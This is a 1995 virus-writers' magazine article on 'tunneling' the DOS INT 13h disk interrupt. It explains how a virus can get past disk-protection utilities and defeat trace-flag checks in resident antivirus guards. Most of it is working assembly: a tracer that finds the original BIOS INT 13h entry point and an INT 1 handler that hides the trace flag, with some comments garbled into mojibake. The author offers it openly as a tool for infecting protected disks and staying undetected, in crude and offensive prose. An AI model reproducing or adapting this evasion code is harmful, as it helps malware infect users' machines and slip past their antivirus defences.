	   ÜÜ                  Û
	  ßßß Monthly Magazine Û For VirMakers.                  JULY '95
	  ßÛÛ ßßßßßßßßßßßßßßßß Û ßßßßßßßßßßßßßßßßßßß ß ßßßßŞßßß  ÛßßßßßßÛ
	   ŞÛ ÛßÜ Ûßß Üßß Üßß ÜÛÜ Üßß ÛßÛ    İ Û ÜßÛ Û Üßß ÛÜÜ   Û ŞßßÛ Û
	    Û Û Û Ûß  Ûß  Û    Û  Ûß  Û Û    Û Û Û Û Û Û   Û     Û   Şİ Û
	    Û Ş Ş Ş   ŞÜÜ ŞÜÜ  Ş  ŞÜÜ ŞÜß     ßÛ ßÜÛ Ş ŞÜÜ ŞÜÜÜ  Û   Û  Û
	    Ş ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ  ÛÜÜÜÜÜÜÛ
	   (C) STEALTH group WWide, Box 10, Kiev-148, fUcKRAINE 
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
			Tunneling without borders.              (C) LovinGOD
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

1. Who will be the one to safely to execute your command ?
 Who will sweep off the magnetic dust from the hard drive, and who must I
 ask to pass a pack of sweets to the imprisoned MBR ?

 Int 13 is it. This name creates scarlet fear when users, if they know
 what it is, hear its name. It is the One who rules and defines the destiny
 of all data on disk. The ways of this god are unknown; it can format all
 your HD to hell, replace the furniture and even throw away all GIFing
 whores from the public house of your hard drive.
 And more, it's terrible, it permanently writes something to the Altar, The
 Sacred FAT, the place where users do not walk nearer than ten tracks away
 from. 

 It is the kindest god. He's ready to do anything you want. To lick off the
 FAT - no problems, possess an MBR - just a millisecond... But nobody can
 ask it.  Why? It doesn't understand the basic BASIC, Pascal, C, etc...,
 English, Russian, Suahili... The only people, beloved by it - Assembler
 programmers, whose mother tongue is Assembler.

 Afraid of conspiracy, users camoflague the sky and keep in sight of all who
 try to visit god by plane. If the plane has a trace flag on board, one
 shot lands it forever. But our Stealth reached the diSKy and asked what
 things the users don't want. Lets read about this fascinating journey...
 
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

2.      What is interrupt tunneling needed for ? For direct access to
  interrupts.  It's general purpose is to get the original vector. But not
  the most important !
  Did your virus try to infect files on protected disk. Not floppy, but
  a partition of the HD, protected by some shitty utilities - local are
  unknown for you, and yours are unknown for us. How does this shit work ?
  In general it's an INT 13h handler, which simply closes access to certain
  disks. Facing such a border, the virus becomes helpless and more easily
  discovered.
  I have no such problems - my virus uses some tricks...
	Set original INT 13h if you're gonna call INT 21h with disk operations.
  It will cut all "protection". If an error occured when you tried to open a
  file (if not any other error) the disk is under a disk stacker or another
  disk chopper. Whatta fu*kin "se la vi" ... Put INT 13h vector back and pray
  for your virus.
	Don't forget to put back the old INT 13h vector after finishing
  your disk operations. Try to erase a file that has just infected the
  protected disk.  "Protection Error" will not allow you this murder. It
  protects... our virus !!!

 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
3.       Anti-Tracing Defenses and their defenseless.

	INT13:          PUSHF
			POP AX
			TEST AH,1                               ; TF is ON!
			JNZ  GO_TO_HELL_YOU_FUCKIN_TRACER
	CONTINUE_INT13: ... ... ...

 Some resident antivirus guards (AVPTSR) contain this piece of code.
 It prevents INT 13,21,2F,... tracing. Rectangle red spot warns you
 about tunneling. Leave the train!  Tunneling is over, and the virus is
 discovered. Who tries tunneling otherwise ? 
 Some programs direct interrupt code to an IRET if the trace flag is set.

 You must modify your trace procedure to blow up flag watchers. If somebody
 wants to ask about the TraceFlag - give them a flag register without the
 required TF. Vice versa, set TF if somebody tries to change the flag
 register.
 
 Three commands you need to watch for:

	PUSHF       -   clear TF in register, push it to stack
	POPF, IRET  -   set TF in stack before executing these commands

 Doing this you'll prevent your tracer from being detected.
				
				See your new virii soon !
							LovinGOD.

4.ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

TRACE13:                                   ; Setting trace routines
					   ; Intercept vectors without save
	XOR AX,AX                       
	MOV ES,AX

	CLT                                ; Clear Trace Flag  
					   ; (See macros at the end of prog)
					   
	MOV WORD PTR ES:[0004],TRACER13-START
	MOV ES:[0006],CS

	LES BX,DWORD PTR ES:[0013H*4]      ; Address from IntTable
	MOV CS:[REAL13-START],BX           
	MOV CS:[REAL13+2-START],ES         
					   ; Accept table vector value as
					   ; real if tunneling will fail.

	PUSHF                              ; For Int 13h call
	STT                                ; Set Trace Flag

					   ; INT 13h call for tracing
	MOV  AH,08                         
	MOV  DL,80H                     

CALL13:                                    ; Go!
	DB 9Ah                             
REAL13  DW ?,?
					   ; Interrupt complete.

	MOV  BYTE PTR CS:[TRACER13-START],0CFH  ; IRET to the handler start

	CLT                                ; Clear Trace Flag

						
	; INT 1 handler.
	; Saves address of entry point if segment reaches BIOS (0F000h)
	; and closes down the trace routine. Emulates PUSHF,POPF,IRET.
	
TRACER13 PROC
	DB   90H                                ; Here's the place for IRET
						; when done

	MOV  CS:[BPSAVE-START],BP               ; save registers
	MOV  CS:[SISAVE_-START],SI
	MOV  CS:[DSSAVE-START],DS
	MOV  CS:[AXSAVE-START],AX
	POP  SI DS AX                           ; IP,CS of IRET, Flags
						; DS:SI=Address of Next Cmd
						;    AX=Flags
	PUSH AX                                 
	MOV  AX,DS                              ; BIOS Segment?
	CMP  AH,0F0H
	POP  AX
	JB   NOTREAL            
						; BIOS Segment
						; Saving address - that is
	MOV  CS:[REAL13-START],SI               ; entry point of INT 13h
	MOV  CS:[REAL13-START+2],DS              

	AND  AH,0FEH                            ; Clear trace
	MOV  BYTE PTR CS:[TRACER13-START],0CFH  ; IRET to the handler start
	JMP  ALLBACK

     NOTREAL:                                   ; BIOS not reached yet
	MOV BP,SP

	CMP BYTE PTR DS:[SI],@PUSHF             ; Is PUSHF the next ?
	JNE NXTT

	INC  SI                                 ; IRET ­  ª®¬¬ ­¤ã ¯®á«¥ PUSHF
	PUSH AX                                 ; ‘ ¬¨ ¤¥« ¥¬ PUSHF
	AND BYTE PTR [BP-1],0FEH                ; —¨áâ¨¬ TF ¢® "ä« £ å"

     ALLBACK:                                   ; ¢ëå®¤
	PUSH AX DS SI                           ; ­ ¡®à ¤«ï IRET - ¢ áâ¥ª
	SISAVE_ EQU $+1                         ; ¢®ááâ ­ ¢«¨¢ ¥¬ à¥£¨áâàë
	MOV  SI,0000
	DSSAVE  EQU $+1
	MOV  AX,0000
	MOV  DS,AX
	AXSAVE  EQU $+1
	MOV  AX,0000
	BPSAVE  EQU $+1
	MOV  BP,0000                            
	IRET                                    

     NXTT:                                      
	CMP BYTE PTR DS:[SI],@POPF              
	JNE NXTT2
						; á«¥¤. ª®¬¬ ­¤  - POPF
	OR WORD PTR [BP],0100H                  ; “áâ ­ ¢«¨¢ ¥¬ TF
	JMP ALLBACK

     NXTT2:
	CMP BYTE PTR DS:[SI],@IRET
	JNE ALLBACK
						; á«¥¤. ª®¬¬ ­¤  - IRET 
	OR WORD PTR [BP+04],0100H               ; “áâ ­ ¢«¨¢ ¥¬ TF ¢® ä« £ å
	JMP ALLBACK     

TRACER13 ENDP
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
5. Macros and equates.

	CLT MACRO               ;  clear trace flag
		push ax
		pushf
		pop ax
		and ah,0feh
		push ax
		popf
		pop ax
		ENDM

	STT MACRO               ;  set trace flag

		push ax
		pushf
		pop ax
		or ah,1
		push ax
		popf
		pop ax
		ENDM




